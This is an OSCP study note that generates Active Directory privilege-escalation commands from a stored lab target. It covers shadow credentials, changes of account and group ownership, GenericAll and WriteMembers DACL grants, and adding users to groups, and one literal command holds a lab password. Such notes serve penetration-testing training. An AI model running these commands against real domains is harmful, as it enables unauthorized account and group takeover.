You can change the ownership of the object.
# User

#### Add a shadow credential:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `certipy-ad shadow auto -u [adminUser]@${discoveredDomain} -p [adminPW] -account '[targetUser]' -dc-ip ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Change Account Owner
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const ip = page?.IP ?? "NO IP FOUND";

const command = `bloodyAD -d ${discoveredDomain} --host ${ip} -u [adminUser] -p [adminPW] set owner [targetAccountName] [AdminAccountName]`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Give GenericAll
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const ip = page?.IP ?? "NO IP FOUND";

const command = `bloodyAD -d ${discoveredDomain} --host ${ip} -u [adminUser] -p [adminPW] add genericAll [targetUser] [adminUser]`;

dv.paragraph("```bash\n" + command + "\n```");
```
---
# Group

Add user to this group
#### Modify owner
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `impacket-owneredit -action write -new-owner [adminUser] -target [groupName] ${discoveredDomain}/[adminUser]:[adminPW] -dc-ip ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Modify Rights
dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.4
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `impacket-dacledit -action 'write' -rights 'WriteMembers' -principal [adminUser] -target [groupName] '${discoveredDomain}'/'[adminUser]':'[adminPW]' -dc-ip ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Add to group
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `net rpc group addmem [group] [adminUser] -U "${discoveredDomain}"/"[adminUser]"%"[adminPW]" -S ${ip}`

dv.paragraph("```bash\n" + command + "\n```");
```
#### Check group members
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `net rpc group members [group] -U "${discoveredDomain}"/"[adminUser]"%"[adminPW]" -S ${ip}`

dv.paragraph("```bash\n" + command + "\n```");
```
